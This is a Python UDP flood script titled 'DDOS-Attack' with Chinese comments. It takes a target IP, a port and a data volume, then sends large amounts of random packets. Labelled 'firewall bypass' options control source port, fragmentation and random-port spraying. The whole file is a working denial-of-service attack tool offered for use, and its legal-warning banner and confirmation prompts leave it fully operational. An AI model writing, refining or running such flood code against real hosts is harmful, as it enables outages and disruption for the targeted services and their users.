import sys
import os
import time
import socket
import ipaddress
import random

# ==================== 启动艺术字与法律警告 ====================

os.system("clear")
print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   BC-809")
print("M       MMM M       MMM MMM     MMM MM       MM   BC-809")
print("M  MMMM   M M  MMMM   M M   MMM   M M  MMMMM  M   BC-809")
print("M  MMMMM  M M  MMMMM  M M  MMMMM  M M        MM   BC-809")
print("M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M   BC-809")
print("M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M   BC-809")
print("M        MM M        MM MMM     MMM MM       MM   BC-809")
print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   BC-809")
print("严重警告")
print("你已经触碰到了法律和道德边缘，请立即退出，或等待3秒")
time.sleep(1)
print("3")
time.sleep(1)
print("2")
time.sleep(1)
print("1")
time.sleep(1)
print("Starting...")
time.sleep(2)

os.system("clear")
os.system("figlet DDOS-Attack")
print("Author    : BCU-0")
print("GitHub    : https://github.com/BC-809/DDOS-Attack.git")
print("")

# ==================== 参数输入与验证 ====================

# 目标 IP 验证
while True:
    try:
        ip_str = input("IP Target : ").strip()
        ipaddress.ip_address(ip_str)   # 验证合法性
        target_ip = ip_str
        break
    except ValueError:
        print("[!] 无效的 IP 地址，请重新输入。")

# 目标端口验证
while True:
    try:
        port_str = input("Port : ").strip()
        target_port = int(port_str)
        if 1 <= target_port <= 65535:
            break
        else:
            print("[!] 端口必须在 1-65535 之间。")
    except ValueError:
        print("[!] 无效的端口号，请输入数字。")

# 总流量输入（单位 GB）
while True:
    try:
        gb_str = input("Total data to send (GB) : ").strip()
        total_gb = float(gb_str)
        if total_gb <= 0:
            print("[!] 流量必须大于 0 GB。")
            continue
        break
    except ValueError:
        print("[!] 无效的数值，请输入数字。")

# 可选速率限制（发包间隔）
rate_limit = 0.0
try:
    rate_str = input("Packet interval in seconds (0 = max speed, e.g. 0.1) : ").strip()
    rate_limit = float(rate_str)
except ValueError:
    rate_limit = 0.0

# ---------- 防火墙绕过选项 ----------
print("\n--- 防火墙绕过选项 (仅供实验) ---")
src = input("指定源端口 (留空则系统随机分配): ").strip()
source_port = int(src) if src else None

frag = input("启用 IP 分片? (y/N): ").strip().lower()
use_fragmentation = (frag == 'y')

rnd = input("使用随机目标端口? (y/N): ").strip().lower()
random_target_port = (rnd == 'y')

# 根据分片设置载荷大小
if use_fragmentation:
    PACKET_SIZE = 3000   # 大于常见 MTU，强制分片
else:
    PACKET_SIZE = 1490

total_bytes = int(total_gb * 1024 * 1024 * 1024)
max_packets = total_bytes // PACKET_SIZE
print(f"\n[*] 将发送 {max_packets} 个数据包，总计 {total_gb:.2f} GB。")
if rate_limit > 0:
    print(f"[*] 发包间隔: {rate_limit} 秒")
if source_port is not None:
    print(f"[*] 源端口: {source_port}")
if use_fragmentation:
    print(f"[*] IP 分片已启用，单包载荷 {PACKET_SIZE} 字节")
if random_target_port:
    print("[*] 随机目标端口模式已启用")

# ==================== 目标可达性检查 ====================

def check_target(ip, port):
    """简单 TCP 连接测试"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((ip, port))
        s.close()
        return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

print("[*] 正在检查目标连通性...")
if not check_target(target_ip, target_port):
    print("[!] 目标似乎不可达或 TCP 端口未开放。")
    choice = input("是否仍要尝试发送？(y/n): ").strip().lower()
    if choice != 'y':
        sys.exit(1)

# 最终确认
while True:
    confirm = input("\n[!] 最后警告：你即将向目标发送大量 UDP 流量。请确认 (yes/no): ").strip().lower()
    if confirm == 'yes':
        break
    elif confirm == 'no':
        print("[*] 用户取消。")
        sys.exit(0)
    else:
        print("[!] 请输入 yes 或 no。")

# ==================== 攻击发送循环 ====================

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# 源端口绑定
if source_port is not None:
    try:
        sock.bind(('', source_port))
    except OSError as e:
        print(f"[!] 无法绑定源端口 {source_port}: {e}")
        sock.close()
        sys.exit(1)

# IP 分片设置
if use_fragmentation:
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MTU_DISCOVER, socket.IP_PMTUDISC_DO)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_DONTFRAGMENT, 0)

payload = os.urandom(PACKET_SIZE)

sent = 0
sent_bytes = 0
next_mb_threshold = 1024 * 1024   # 1 MB
start_time = time.time()

try:
    while sent < max_packets:
        # 确定当前目标端口
        if random_target_port:
            current_port = random.randint(1, 65535)
        else:
            current_port = target_port

        sock.sendto(payload, (target_ip, current_port))
        sent += 1
        sent_bytes += PACKET_SIZE

        # 如果不使用随机端口，才进行端口递增
        if not random_target_port:
            target_port += 1
            if target_port > 65534:
                target_port = 1

        # 每 1 MB 输出一次进度
        if sent_bytes >= next_mb_threshold:
            mb_sent = sent_bytes / (1024 * 1024)
            elapsed = time.time() - start_time
            pps = sent / elapsed if elapsed > 0 else 0
            print(f"已发送: {sent} 包 ({mb_sent:.2f} MB) | 用时: {elapsed:.1f}s | 速率: {pps:.1f} pps")
            next_mb_threshold += 1024 * 1024

        # 速率限制
        if rate_limit > 0:
            time.sleep(rate_limit)

except KeyboardInterrupt:
    print("\n[!] 用户手动停止发送。")
except Exception as e:
    print(f"\n[!] 错误: {e}")
finally:
    sock.close()
    elapsed = time.time() - start_time
    print(f"\n[+] 发送完成。总包数: {sent}, 总数据量: {sent_bytes / (1024*1024):.2f} MB, 用时: {elapsed:.2f} 秒。")
